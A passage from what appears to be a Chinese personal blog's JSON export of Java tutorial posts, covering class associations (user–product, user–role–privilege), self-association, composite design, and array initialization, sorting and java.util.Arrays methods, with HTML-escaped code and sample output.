&#125; System.out.println(&quot;----------------------------&quot;) ; System.out.println(&quot;【所属主类】：&quot; + SubItems[0].getItem().getInfo() ) ; &#125;&#125;/**【类编号】：1000、【类别名】：主类别 |【子类编号】：1001、【子类名称】：子类1 |【子类编号】：1002、【子类名称】：子类2 |【子类编号】：1003、【子类名称】：子类3----------------------------【所属主类】：【类编号】：1000、【类别名】：主类别**/ 多对多 要求获取如下信息： 获取一个用户访问过的所用商品信息； 获取一个商品，被浏览的全被用户信息。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091class User &#123; private long uid ; private String name ; private Product[] products ; public User () &#123;&#125; public User (long uid, String name) &#123; this.uid = uid ; this.name = name ; &#125; public void setProducts(Product ... products) &#123; this.products = products ; &#125; public Product[] getProducts() &#123; return this.products; &#125; // setter、getter 略 public String getInfo() &#123; return &quot;【用户编号】：&quot; + this.uid + &quot;、【用户名】：&quot; + this.name ; &#125;&#125;class Product &#123; private long pid ; private String name ; private double price ; private User[] users ; public Product() &#123;&#125; public Product(long pid, String name, double price) &#123; this.pid = pid ; this.name = name ; this.price = price ; &#125; public void setUsers(User ... users) &#123; this.users = users ; &#125; public User[] getUsers() &#123; return this.users ; &#125; // setter, getter() 略 public String getInfo() &#123; return &quot;【产品编号】：&quot; + this.pid + &quot;、【产品名】：&quot; + this.name + &quot;、【产品价格】：&quot; + this.price ; &#125;&#125;public class Hello &#123; public static void main(String[] args) &#123; User user1 = new User(10001L, &quot;张三&quot;) ; User user2 = new User(10002L, &quot;李四&quot;) ; User user3 = new User(10003L, &quot;王五&quot;) ; Product pro1 = new Product(1001L, &quot;肥皂&quot;, 4.0) ; Product pro2 = new Product(1002L, &quot;汽水&quot;, 2.5) ; Product pro3 = new Product(1003L, &quot;盆&quot;, 10.0) ; Product pro4 = new Product(1004L, &quot;篮球&quot;, 300.0) ; user1.setProducts(pro1, pro3) ; user2.setProducts(pro2, pro4) ; user3.setProducts(pro1, pro2, pro3) ; pro1.setUsers(user1, user3) ; pro2.setUsers(user2, user3) ; pro3.setUsers(user1, user3) ; pro4.setUsers(user2) ; System.out.println(user1.getInfo()) ; for(Product pro : user1.getProducts()) &#123; System.out.println(&quot;\\t|-【浏览过产品】&quot; + pro.getInfo()) ; &#125; System.out.println(&quot;---------------------------------------&quot;) ; System.out.println(pro1.getInfo()) ; for(User use : pro1.getUsers()) &#123; System.out.println(&quot;\\t|-【浏览过该产品的用户】&quot; + use.getInfo()) ; &#125; &#125;&#125;/**【用户编号】：10001、【用户名】：张三 |-【浏览过产品】【产品编号】：1001、【产品名】：肥皂、【产品价格】：4.0 |-【浏览过产品】【产品编号】：1003、【产品名】：盆、【产品价格】：10.0---------------------------------------【产品编号】：1001、【产品名】：肥皂、【产品价格】：4.0 |-【浏览过该产品的用户】【用户编号】：10001、【用户名】：张三 |-【浏览过该产品的用户】【用户编号】：10003、【用户名】：王五**/ 复杂多对多 实际开发过程中，对用户授权是非常常见的重要任务。关系如上： 一个用户可以拥有多个儿角色； 一个角色具有多个权限。 要求实现如下查询功能： 可以根据一个用户找到他所拥有的所有角色，以及每一个角色所具有的权限信息； 可以根据一个角色找到具备该角色的所用用户，以及每一个角色所拥有的所有权限信息； 可以根据一个权限，找到具有该权限的所用用户信息。 注意： 程序的设计，只需要设计出三个主要类，对于关系表不需要进行设计。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240class Manager &#123; private long mid ; private String name ; private Role[] roles ; public Manager() &#123;&#125; public Manager(long mid , String name) &#123; this.mid = mid ; this.name = name ; &#125; public void setRole(Role ... roles) &#123; this.roles = roles ; &#125; public Role[] getRole() &#123; return this.roles ; &#125; // getter, setter 略 public String getInfo() &#123; return &quot;【用户编号】：&quot; + this.mid + &quot;、【用户职位】：&quot; + this.name ; &#125;&#125;class Role &#123; private long rid ; private String name ; private Manager[] mgrs ; private Privilege[] pris ; public Role() &#123;&#125; public Role(long rid, String name) &#123; this.rid = rid ; this.name = name ; &#125; public void setManager(Manager ... mgrs) &#123; this.mgrs = mgrs ; &#125; public Manager[] getManager() &#123; return this.mgrs ; &#125; public void setPrivilege(Privilege ... pris) &#123; this.pris = pris ; &#125; public Privilege[] getPrivilege() &#123; return this.pris ; &#125; // getter, setter 略 public String getInfo() &#123; return &quot;【角色编号】：&quot; + this.rid + &quot;、【角色名】：&quot; + this.name ; &#125;&#125;class Privilege &#123; private long pid ; private String name ; private Role[] roles ; public Privilege() &#123;&#125; public Privilege(long pid, String name) &#123; this.pid = pid ; this.name = name ; &#125; public void setRole(Role ... roles) &#123; this.roles = roles ; &#125; public Role[] getRole() &#123; return this.roles ; &#125; // getter, setter 略 public String getInfo() &#123; return &quot;【权限编号】：&quot; + this.pid + &quot;、【权限名】：&quot; + this.name ; &#125;&#125;public class Hello &#123; public static void main(String[] args) &#123; Manager mgr1 = new Manager(10001L, &quot;阿方&quot;) ; Manager mgr2 = new Manager(10002L, &quot;阿花&quot;) ; Manager mgr3 = new Manager(10003L, &quot;大牛&quot;) ; Manager[] mgrs = new Manager[]&#123;mgr1, mgr2, mgr3&#125; ; Role role1 = new Role(20001L, &quot;人事总管&quot;) ; Role role2 = new Role(20002L, &quot;技术总监&quot;) ; Role role3 = new Role(20003L, &quot;项目经理&quot;) ; Role role4 = new Role(20004L, &quot;保洁队长&quot;) ; Role[] roles = new Role[]&#123;role1, role2, role3, role4&#125; ; Privilege pri1 = new Privilege(30001L, &quot;裁员&quot;) ; Privilege pri2 = new Privilege(30002L, &quot;招聘&quot;) ; Privilege pri3 = new Privilege(30003L, &quot;面试&quot;) ; Privilege pri4 = new Privilege(30004L, &quot;开发&quot;) ; Privilege pri5 = new Privilege(30005L, &quot;培训&quot;) ; Privilege pri6 = new Privilege(30006L, &quot;申请项目&quot;) ; Privilege pri7 = new Privilege(30007L, &quot;结项&quot;) ; Privilege pri8 = new Privilege(30008L, &quot;值日&quot;) ; Privilege pri9 = new Privilege(30009L, &quot;打扫&quot;) ; Privilege[] pris = new Privilege[]&#123;pri1, pri2, pri3, pri4, pri5, pri6, pri7, pri8, pri9&#125; ; mgr1.setRole(role2, role3) ; mgr2.setRole(role1, role4) ; mgr3.setRole(role3) ; role1.setManager(mgr2) ; role2.setManager(mgr1) ; role3.setManager(mgr1, mgr3) ; role4.setManager(mgr2) ; role1.setPrivilege(pri1, pri2, pri3) ; role2.setPrivilege(pri3, pri4, pri5) ; role3.setPrivilege(pri6, pri7) ; role4.setPrivilege(pri8, pri9) ; pri1.setRole(role1) ; pri2.setRole(role1) ; pri3.setRole(role1, role2) ; pri4.setRole(role2) ; pri5.setRole(role2) ; pri6.setRole(role3) ; pri7.setRole(role3) ; pri8.setRole(role4) ; pri9.setRole(role4) ; System.out.println(&quot;------根据用户信息，输出用户角色，和所拥有的权限------&quot;); for(Manager mgr : mgrs) &#123; System.out.println(mgr.getInfo()) ; for(Role role : mgr.getRole()) &#123; System.out.println(&quot;\\t|-【任职角色】：&quot; + role.getInfo()) ; for(Privilege pri : role.getPrivilege()) &#123; System.out.println(&quot;\\t\\t|-【具备的权限】：&quot; + pri.getInfo()) ; &#125; System.out.println() ; &#125; System.out.println() ; &#125; System.out.println(&quot;\\n------根据角色信息，输出所拥该角色的用户------&quot;); for(Role role : roles) &#123; System.out.println(role.getInfo()) ; for(Manager mgr : role.getManager()) &#123; System.out.println(&quot;\\t|-【所属用户】：&quot; + mgr.getInfo()) ; &#125; System.out.println() ; &#125; System.out.println(&quot;\\n------根据权限，输出拥有该权限的用户------&quot;); for(Privilege pri : pris) &#123; System.out.println(pri.getInfo()) ; for(Role role : pri.getRole()) &#123; for(Manager mgr : role.getManager()) &#123; System.out.println(&quot;【授权用户】：&quot; + mgr.getInfo()) ; &#125; &#125; System.out.println() ; &#125; &#125;&#125;/**------根据用户信息，输出用户角色，和所拥有的权限------【用户编号】：10001、【用户职位】：阿方 |-【任职角色】：【角色编号】：20002、【角色名】：技术总监 |-【具备的权限】：【权限编号】：30003、【权限名】：面试 |-【具备的权限】：【权限编号】：30004、【权限名】：开发 |-【具备的权限】：【权限编号】：30005、【权限名】：培训 |-【任职角色】：【角色编号】：20003、【角色名】：项目经理 |-【具备的权限】：【权限编号】：30006、【权限名】：申请项目 |-【具备的权限】：【权限编号】：30007、【权限名】：结项【用户编号】：10002、【用户职位】：阿花 |-【任职角色】：【角色编号】：20001、【角色名】：人事总管 |-【具备的权限】：【权限编号】：30001、【权限名】：裁员 |-【具备的权限】：【权限编号】：30002、【权限名】：招聘 |-【具备的权限】：【权限编号】：30003、【权限名】：面试 |-【任职角色】：【角色编号】：20004、【角色名】：保洁队长 |-【具备的权限】：【权限编号】：30008、【权限名】：值日 |-【具备的权限】：【权限编号】：30009、【权限名】：打扫【用户编号】：10003、【用户职位】：大牛 |-【任职角色】：【角色编号】：20003、【角色名】：项目经理 |-【具备的权限】：【权限编号】：30006、【权限名】：申请项目 |-【具备的权限】：【权限编号】：30007、【权限名】：结项------根据角色信息，输出所拥该角色的用户------【角色编号】：20001、【角色名】：人事总管 |-【所属用户】：【用户编号】：10002、【用户职位】：阿花【角色编号】：20002、【角色名】：技术总监 |-【所属用户】：【用户编号】：10001、【用户职位】：阿方【角色编号】：20003、【角色名】：项目经理 |-【所属用户】：【用户编号】：10001、【用户职位】：阿方 |-【所属用户】：【用户编号】：10003、【用户职位】：大牛【角色编号】：20004、【角色名】：保洁队长 |-【所属用户】：【用户编号】：10002、【用户职位】：阿花------根据权限，输出拥有该权限的用户------【权限编号】：30001、【权限名】：裁员【授权用户】：【用户编号】：10002、【用户职位】：阿花【权限编号】：30002、【权限名】：招聘【授权用户】：【用户编号】：10002、【用户职位】：阿花【权限编号】：30003、【权限名】：面试【授权用户】：【用户编号】：10002、【用户职位】：阿花【授权用户】：【用户编号】：10001、【用户职位】：阿方【权限编号】：30004、【权限名】：开发【授权用户】：【用户编号】：10001、【用户职位】：阿方【权限编号】：30005、【权限名】：培训【授权用户】：【用户编号】：10001、【用户职位】：阿方【权限编号】：30006、【权限名】：申请项目【授权用户】：【用户编号】：10001、【用户职位】：阿方【授权用户】：【用户编号】：10003、【用户职位】：大牛【权限编号】：30007、【权限名】：结项【授权用户】：【用户编号】：10001、【用户职位】：阿方【授权用户】：【用户编号】：10003、【用户职位】：大牛【权限编号】：30008、【权限名】：值日【授权用户】：【用户编号】：10002、【用户职位】：阿花【权限编号】：30009、【权限名】：打扫【授权用户】：【用户编号】：10002、【用户职位】：阿花**/","link":"","tags":[{"name":"java","slug":"java","permalink":"http://www.fangning.xyz.com/tags/java/"}]},{"title":"引用应用分析","date":"2021-11-08T14:21:30.000Z","path":"2021/11/08/2021.11.08 引用应用分析/","text":"类的关联生活中两个不相干的事物，可能会具有一定联系；就好比两个不同的类，如何实现两者相联。 场景 人买车，人是一个类，车是一个类；要求实现两个关联，并且能够通过人找到所拥有的车；通过车，找到主人。 一个公园有多个人散步；公园是一个类，人是一个类；通过公园可以找到时在公园里面的人，通过人，找到人所在的地点。 思维 设计类的时候，在两个类中互相添加需要关联的类的属性字段。 就类似与数据库，两张表相关联，需要彼此设置主键，外键。 关联属性一定是私有的，并且不能通过构造方法进行设置，因为关系不是与生俱来的，是生活中的事件触的。 你不是生来就有车，车也不是生产出来就有归属，所以关联字段只能通过普通setter方法进行设置。 设计步骤： 编写两个群体的类，并彼此设置关联属性，添加另一方类型的属性字段； 声明，并初始化两个对象； 彼此调用 setter 方法的参数，进行关联属性设置；人买车，就把车对象通过 setter 方法参数，传递给人的属性中；同时，通过 setter 方法参数，把人对象传递到属性中。 互相通过方法寻找；两个关联的群体具有练习，通过人，能够找到它所拥有的车；通过车，能够找到所归属的人。getter 方法返回的就是所关联的对象。 设置关系就是通过 settr() 方法来设置关联字段属性。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566class Car &#123; private String name ; private double price ; private Person person ; // 设置关联属性 public Car() &#123;&#125; public Car(String name, double price) &#123; this.name = name ; this.price = price ; &#125; // 关联方法 public void setPerson(Person person) &#123; this.person = person ; &#125; public Person getPerson() &#123; //对象为空情况 return this.person ; &#125; public String getInfo() &#123; return &quot;车名：&quot; + this.name + &quot;、价值：&quot; + this.price ; &#125;&#125;class Person &#123; private String name ; private int age ; private Car car ; // 设置关联属性 public Person() &#123;&#125; public Person(String name, int age) &#123; this.name = name ; this.age = age ; &#125; // 关联方法 public void setCar(Car car) &#123; this.car = car ; &#125; public Car getCar() &#123; return this.car ; &#125; public String getInfo() &#123; return &quot;姓名：&quot; + this.name + &quot;，年龄：&quot; + this.age ; &#125;&#125;public class Hello &#123; public static void main(String[] args) &#123; // 第一步初始化两个关联对象 一个人，一辆车 Person person = new Person(&quot;张三&quot;, 21) ; Car car = new Car(&quot;红旗&quot;, 100000.00) ; // 第二步互相绑定 人买了车，车卖给人 person.setCar(car) ; car.setPerson(person) ; // 第三步相互可通过代码链访问 通过人找到车，通过车知道人 System.out.println(person.getInfo() + &quot;\\n\\t-资产：&quot; + person.getCar().getInfo() ) ; System.out.println(car.getInfo() + &quot;\\n\\t-所属：&quot; + car.getPerson().getInfo() ); &#125;&#125;/**姓名：张三，年龄：21 -资产：车名：红旗、价值：100000.0车名：红旗、价值：100000.0 -所属：姓名：张三，年龄：21**/ 自身关联同属于同一类，的不同对象之间也会存在关系，比如同样是人，会有父母和子女的关系； 这些关系的匹配，在实际开发过程中十分常见。并且都是通过引用数据类型来实现的。 场景 一个人有多个孩子，每个孩子还拥有车子；孩子和人都是人类，车子为车类型，人可以有多个孩子。要求表示三者关系，并且通过人找到他的孩子，再找到孩子的车子。 思维 同一个人类中设置 chidren 属性，chidren 的类型可以是人类本身。也就是同一个类内部建立关系。 然后依旧就是通过 setter() 和 getter() 方法进行关联属性设置和获取。 通过代码链来进行关联访问。 给 Person 人类，设置父母类数组，子女类数组。通过 “Person … children” 设置可变参数个数的 setChildren() 方法。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107class Car &#123; // 固有属性 private String brand ; private double price ; // 关联属性 private Person person ; public Car()&#123;&#125; public Car(String brand, double price) &#123; this.brand = brand ; this.price = price ; &#125; public void setPerson(Person person) &#123; this.person = person ; &#125; public Person getPerson() &#123; return this.person ; &#125; public String getInfo() &#123; return &quot;品牌：&quot; + this.brand + &quot;、价值：&quot; + this.price ; &#125;&#125;class Person &#123; // 固有属性 private String name ; private int age ; // 关联属性 Person[] parents ; Person[] children ; Car car; public Person() &#123;&#125; public Person(String name , int age) &#123; this.name = name ; this.age = age ; &#125; public void setParents(Person ... parents) &#123; this.parents = parents ; &#125; public void setChildren(Person ... children) &#123; this.children = children ; &#125; public void setCar(Car car) &#123; this.car = car ; &#125; public Person[] getParents() &#123; return this.parents ; &#125; public Person[] getChildren() &#123; return this.children ; &#125; public Car getCar() &#123; return this.car ; &#125; public String getInfo()&#123; return &quot;姓名：&quot; + this.name + &quot;、年龄：&quot; + this.age ; &#125;&#125;public class Hello &#123; public static void main(String[] args) &#123; Person father = new Person(&quot;方宁&quot;, 51) ; Person son = new Person(&quot;方大牛&quot;, 21) ; Person daughter = new Person(&quot;方可晴&quot;, 18) ; Car car1 = new Car(&quot;兰博基尼&quot;, 19999999.99) ; Car car2 = new Car(&quot;劳斯莱斯&quot;, 6000000.00) ; Car car3 = new Car(&quot;五菱宏光&quot;, 30000.00) ; father.setCar(car1) ; car1.setPerson(father) ; father.setChildren(son, daughter) ; son.setParents(father) ; daughter.setParents(father) ; daughter.setCar(car2) ; car2.setPerson(daughter) ; son.setCar(car3) ; car3.setPerson(son) ; System.out.println( father.getInfo() ) ; System.out.println(&quot;\\t-车：&quot; + father.getCar().getInfo()) ; System.out.println( &quot;\\t-&quot; + &quot;儿女：&quot; ) ; for( int i = 0; i &lt; father.children.length; i++)&#123; System.out.println( &quot;\\t\\t-成员&quot; + i + &quot;：&quot; + father.children[i].getInfo() ) ; System.out.println( &quot;\\t\\t\\t-车：&quot; + father.children[i].getCar().getInfo() ) ; &#125; &#125;&#125;/**姓名：方宁、年龄：51 -车：品牌：兰博基尼、价值：1.999999999E7 -儿女： -成员0：姓名：方大牛、年龄：21 -车：品牌：五菱宏光、价值：30000.0 -成员1：姓名：方可晴、年龄：18 -车：品牌：劳斯莱斯、价值：6000000.0**/ 合成设计模式合成设计模式： 任何人类产品都是可以进行拆分，并且进行组合的，所以这种设计 java 中就叫做合成设计。 所谓面向对象，就是把事物进行拆分，用的时候按照一定的标准进行合并！这java面向对象最为核心的要素！ 场景要求定义一种可以描述电脑组成的类，在这样一种状态下，必须进行拆分。 电脑分为两个部分：主机、显示器；主机包含键盘、鼠标、主板；主板包括了硬盘、cpu、显卡、内存 … 思维1234567891011121314151617181920212223242526// 伪代码class 电脑 &#123; private 显示器 ; private 主机 ;&#125;class 主机 &#123; private 主板 ; private 鼠标 ; private 键盘 ;&#125;class 主板 &#123; private cpu[] 对象数组 ; private 内存[] 对象数组 ; private 硬盘[] 对象数组 ; private 显卡 ;&#125;class 显示器 &#123;&#125;class 鼠标 &#123;&#125;class 键盘 &#123;&#125;class cpu &#123;&#125;class 内存 &#123;&#125;class 硬盘 &#123;&#125;class 显卡 &#123;&#125;","link":"","tags":[{"name":"java","slug":"java","permalink":"http://www.fangning.xyz.com/tags/java/"}]},{"title":"数组的定义与使用","date":"2021-11-06T08:32:30.000Z","path":"2021/11/06/2021.11.06 数组定义与使用/","text":"一维数组## 基本概念 一组相关变量的集合。 java 中数组是 引用数据类型，需要使用 new 进行实例化。 实际开发过程中，一维数组非常常见。 初始化 动态初始化（声明，实例化） 惯用：数据类型[] 数组名 = new 数据类型[长度] 数据类型 数组名[] = new 数据类型[长度] 静态初始化（声明，实例化，并赋定义） 简化格式：数据类型[] 数组名 = &#123;数据1， 数据2， 数据3， ...&#125; ; 完整格式：数据类型[] 数组名 = new 数据类型[]&#123;数据1， 数据2， 数据3， ....&#125;; 类类型数组 相当于C语言里面的指针数组，每一个元素只是一个地址，并没有实例化空间； 实例化完类类型数组，并没有实例化数组里面的元素！用之前还得为每一个元素分配堆空间。 12345678class product &#123; String name ; double price ;&#125;product[] array = new product[10] ;array[0] = new product() ; // 此处为每个元素实例化！array[0].name = &quot;汽水&quot; ;array[0].price = 2.5 ; 空数组 如果有时候需要一个数组为空，可以给其实例化长度为 0 如果 array = null; 那么 array.length 等操作会报错。 12int[] array = new int[0];System.out.println(array.length) ; // 0 内存分析 数组名存在于栈区，保存一个地址，指向堆区的实例。 实例对象，包含数组长度个整数，存储在堆区。 引用传递=号赋值数组进行引用传递的时候，两个参考变量名，所指向的是同一块堆空间，操作的是同一个数组对象。 123456789public static void main(string[] args) &#123; int[] array = new int[]&#123;1, 3, 4&#125; ; int[] array2 = array ; // 引用飘逸 array2[0] = 2 ; for( int i = 0; i &lt; array.length; i++ ) &#123; System.out.printf(&quot;%d%c&quot;, array[i], (i == array.lenth-1) ? &#x27;\\n&#x27; : &#x27; &#x27;) ; &#125;&#125;// result: 2 3 4 方法中形参传递同 C 中的字符串通过函数参数传递，传递的是地址，方法中修改的也是同一个对象空间。 123456789public static void main (String[] args) &#123; int[] array = new int[]&#123;1, 2, 3, 4&#125; ; printArray(array) ;&#125;public static void printArray(int[] array) &#123; for(int i : array) &#123; System.out.println(i) ; &#125;&#125; 遍历 数组名.length 获取数组长度。 length是每一个数组对象的公开属性，可以使用 ‘.’ 直接访问符进行访问。 for 循环进行遍历 ， 同 C 语言一维数组； 123int[] array = new int[]&#123;1, 2, 3, 4&#125; ;for(int i = 0; i &lt; array.length; i++) System.out.println(array[i]) ; foreach 循环； 将数组内容取出，存放到一个变量中。可以避免下标的操作，直接操作内部数据。 123int[] array = new int[]&#123;1, 2, 3, 4&#125; ;for(int i : array) System.out.println(i) ; foreach 关键是把数组内容取出了，使用元素类型遍历；不用 foreach 需要间接访问数组元素，用 foreach 可以直接访问。类似 c++ 中迭代器间接访问，foreach直接访问 vector 。 二维数组实际开发过程中，几乎很少使用二维数组。 内存分析 不同于 C 语言中的二维数组，必须是行列相等的行列式！和 C++ STL vector&lt; vector&lt; int &gt; &gt;容器一样， 先存一列，然后每一列的元素指向一个一维数组。 即存储一维数组的一维数组！ 遍历 array.length 表示一列的长度； array[x].length 表示 x 位置所指数组的长度； 完全按照 C++ Vector 来操作即可。 1234567891011121314151617int[][] array = new int[][] &#123; // 静态初始化 &#123;1, 2, 3, 4, 5, 6&#125;, &#123;2, 3&#125;&#125;;// forfor(int i = 0; i &lt; array.length; i++) &#123; for(int j = 0; j &lt; array[i].length; j++) &#123; array[i][j] ; // 间接访问 &#125;&#125;// foreachfor(int[] tmp : array) &#123; for(int x : tmp) &#123; x ; // 已经取出，直接访问 &#125;&#125; 对象数组实际开发过程中，不可能离开对象数组。缺点：数组长度固定；优点：线性保存，索引较快！ 动态初始化 12Person array[] = new Person[3];array[0] = new Person(&quot;张三&quot;， 18) ; 静态初始化 12345Person array[] = new Person[]&#123; new Person(&quot;张三&quot;， 18) , new Person(&quot;李四&quot;， 20) , new Person(&quot;王五&quot;， 21)&#125; ; 内存分析 array、array[0]、array[1]、array[2] 都保存在栈区； 三个 Person实例对象，保存在堆区； 同时，堆区还保存有一个，指向 Person 类型一维数组，里面存有地址。 自定义数组工具类 定义一个类，实现对数组和、平均值、最大值、最小值的计算。 1234567891011121314151617181920212223242526272829303132333435363738394041424344class ArrayUtil &#123; // 操作工具类，不是简单 java 类 private int sum ; private double avg ; private int max ; private int min ; public ArrayUtil(int[] array) &#123; this.max = array[0] ; this.min = array[0] ; for(int x : array) &#123; this.sum += x ; if(this.max &lt; x) this.max = x ; if(this.min &gt; x) this.min = x ; &#125; this.avg = this.sum / array.length ; &#125; public int getSum() &#123; return this.sum ; &#125; public double getAvg() &#123; return this.avg ; &#125; public int getMax() &#123; return this.max ; &#125; public int getMin() &#123; return this.min ; &#125; public String getInfo() &#123; return &quot;数组和：&quot; + this.sum + &quot;，数组平均值：&quot; + this.avg + &quot;，数组最大值：&quot; + this.max + &quot;，数组最小值：&quot; + this.min ; &#125;&#125;public class Hello &#123; public static void main(String[] args) &#123; int[] ary = new int[]&#123;1, 2, 3, 4, 5&#125; ; ArrayUtil aryUtil = new ArrayUtil(ary) ; System.out.println(aryUtil.getInfo()) ; &#125;&#125;/* * 把主方法可做客户端，尽可能的简洁;* 将所有操作，都封装成类进行操作 utilies 实用工具类*/ 数组排序基本排序方法 选择排序（不稳定） 思维：每次遍历选择出最值，然后添加到数组一侧。需要排 n 个数，所以外层循环 n 次，内层每次是从未拍好序的数据中找最值！ 选择排序，最为特殊，也最暴力简单，它不同于冒泡和插入只交换相邻元素，它每次选择最值，与前面的数进行交换，被换下来的数就失去了原来的稳定性！。 插入排序（稳定） 思维：假设前一个数是已经拍好的，然后从后面找一个数，对比排好的数，将其插入到合适的位置。就和抓扑克牌一样，手里的牌是有序的，每次抓一张新牌，从最小开始对比，然后插入到何合适位置，对比过程中，需要交换的就挪动到后面去。 外层从1开始循环，相当于0位置已有序，后面都是无序需要进行抓取的新牌；内层只倒序遍历已经排好的部分，找到需要插入的位置。需要交换，就让有序元素滚到后面一格，让出空间。 因为每次也只交换相邻的数据，所以是稳定的。 冒泡排序（稳定） 思维：外层循环表示需要遍历的次数 n-1，内层循环才是每次从 0 开始交换相邻的数，进行冒泡。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import java.util.Arrays;class ArrayUtil &#123; // 冒泡 public static int[] bubbleSort(int[] array) &#123; int[] ary = Arrays.copyOf(array, array.length) ; int temp; for(int i = 0; i &lt; ary.length-1; i++) &#123; boolean f = true ; for(int j = 0; j &lt; ary.length - i - 1; j++) &#123; if(ary[j] &gt; ary[j+1]) &#123; temp = ary[j]; ary[j] = ary[j+1]; ary[j+1] = temp ; f = false; &#125; &#125; if(f) break ; &#125; return ary ; &#125; // 插入 public static int[] insertSort(int[] array) &#123; int[] a = Arrays.copyOf(array, array.length) ; for(int i = 1; i &lt; a.length; i++) &#123; int curNum = a[i] ; int j ; for(j = i-1; j &gt;= 0; j--) &#123; if(a[j] &gt; curNum) a[j+1] = a[j] ; else break; &#125; a[j+1] = curNum ; &#125; return a; &#125; // 选择 public static int[] selectSort(int[] array) &#123; int[] a = Arrays.copyOf(array, array.length) ; for(int i = 0; i &lt; a.length; i++) &#123; int pos = i ; for(int j = i; j &lt; a.length; j++) &#123; if(a[j] &lt; a[pos]) pos = j; &#125; int temp; temp = a[i] ; a[i] = a[pos] ; a[pos] = temp ; &#125; return a ; &#125; &#125;public class Hello &#123; public static void main(String args[]) &#123; int[] array = new int[]&#123;10, 8, 7, 6, 5, 5, 6, 7, 9, 2&#125; ; System.out.println( Arrays.toString( ArrayUtil.bubbleSort(array) ) ) ; System.out.println( Arrays.toString( ArrayUtil.insertSort(array) ) ) ; System.out.println( Arrays.toString( ArrayUtil.selectSort(array) ) ) ; &#125;&#125; 排序实用类设计注意：不要将所有的处理方法都放到主方法，或者主类当中，不符合面向对象程序设计思维（复用，重用原则） 类中如果没有属性，那么产生实例化对象就没有用，直接把处理过程写成静态方法，不需要实例化产生对象即可进行调用。 12345678910111213141516171819202122232425262728293031class ArrayUtil &#123; public static void maoPao(int[] ary) &#123; int t ; for(int i = 0; i &lt; ary.length-1; i++) &#123; boolean f = true ; for(int j = 0; j &lt; ary.length-i-1; j++) &#123; if(ary[j] &gt; ary[j+1]) &#123; t = ary[j]; ary[j] = ary[j+1]; ary[j+1] = t; f = false; &#125; &#125; if(f) break; &#125; &#125; public static void printArray(int[] ary) &#123; for(int i = 0; i &lt; ary.length; i++) &#123; System.out.print(ary[i] + &quot; &quot;) ; &#125; System.out.println() ; &#125;&#125;public class Hello &#123; public static void main(String[] args) &#123; int[] ary = new int[]&#123;7, 6, 8, 3, 9, 1, 5, 2, 10&#125; ; ArrayUtil.maoPao(ary) ; ArrayUtil.printArray(ary) ; &#125;&#125; 数组逆序把 12345abc 变成 abc12345 数字和字母前后置换，内部保持有序。 方法： 先分别将数字、字母进行逆序；54321cba 然后对整体进行逆序；abc12345 （A逆B逆）逆 = BA 123456789101112131415161718192021222324class ArrayUtil &#123; public static void rev(char[] ary, int l, int r) &#123; int head = l, tail = r; char temp ; while(head &lt; tail) &#123; temp = ary[head]; ary[head] = ary[tail]; ary[tail] = temp; head ++ ; tail -- ; &#125; &#125;&#125;public class Hello &#123; public static void main(String[] args) &#123; String str = &quot;12345abc&quot; ; char ary[] = str.toCharArray();// String类的成员方法。 ArrayUtil.rev(ary, 0, 4); ArrayUtil.rev(ary, 5, ary.length-1); ArrayUtil.rev(ary, 0, ary.length-1) ; System.out.println( java.util.Arrays.toString(ary) ) ; &#125;&#125; 关于数组逆序函数 rever()，最简单的，不容易出错的方法就是，==使用head,和 tail 头部尾部两个变量进行控制交换的下标。while(head&lt;tail)来控制循环的终点==。 数组相关类库 ;​ 虽然系统提供的算法我们自身也可以实现，但是我们只能提供对单一数据类型的排序拷贝，很难针对所有数据类型写重载方法。 数组排序Arrays.sort([array]) 123456// 所在包import java.util.Arrays ;// 静态 sort 方法Arrays.sort(数组对象) ;Arrays.sort(数组对象, 起始点, 结束点的下一个位置) ; 数组拷贝（System）System.arraycopy([array1, Startpos, array2, Startpos, length]) 12345// 系统提供方法System.arraycopy() ;// 4 个参数System.arraycopy(复制源数组, 起始位, 粘贴到目标数组, 起始位, 复制长度) ; 123456789101112131415161718package com.test01 ;import java.util.Arrays;public class Product&#123; public static void main(String[] args) &#123; int[] array = new int[]&#123;8, 7, 6, 5, 4, 3, 2, 1&#125; ; int[] array2 = new int[]&#123;33, 22, 11, 44, 55, 66, 77&#125; ; Arrays.sort(array); Arrays.sort(array2, 0, 3); System.arraycopy(array2, 0, array, 3, 3); for(int x : array) &#123; System.out.print(x + &quot; &quot;) ; &#125; &#125;&#125; 数组属性信息输出java 中所有的类，都是从 Object 类中所继承过来的，Object 自带了一个 toString() 的静态方法，将对象属性转化为字符串进行返回。 String Arrays.toString(array); 1234import java.util.Arrays ;java.util.Arrays.toString() ;// 将数组的成员信息进行输出！ 对象数组，重写对象的 toString() 类，就可以直接调用 Arrays.toString 输出整个数组成员的属性。 数组的 toString() 是调用并连接了类中成员方法 toString()。 123456789101112131415161718192021222324class Person &#123; String name ; int age ; public Person(String name , int age) &#123; this.name = name ; this.age = age ; &#125; public String toString() &#123; return &quot;姓名：&quot; + this.name + &quot;,年龄：&quot; + this.age ; &#125;&#125;public class Hello &#123; public static void main(String args[]) &#123; Person[] peo = new Person[] &#123; new Person(&quot;张三&quot;, 18) , new Person(&quot;李四&quot;, 17) , new Person(&quot;王五&quot;, 20) &#125;; System.out.println(Arrays.toString(peo)) ; &#125;&#125;// [姓名：张三,年龄：18, 姓名：李四,年龄：17, 姓名：王五,年龄：20] 数组复制type Arrays.copyOf(type[] array, length) 从数组中复制出一个新数组，长度自定义length，并返回。 type Arrays.copyOf(type[] array, begin, end) 复制区间，左闭右开。 数组查找，填充Arrays.fill(number)：将数组所有元素全部初始化为 number ； Arrays.binarySearch(number)：查找 number 所在下标，返回 ； 参数个数可变传递 当我们对与一个方法的参数个数不确定时，一般是采用数组传递。 这里，提供了 “int … date” 来表示补不定个数参数，调用的时候可以传递任意个参数，而不需要实例化数组再传递。 12345678910111213141516171819class 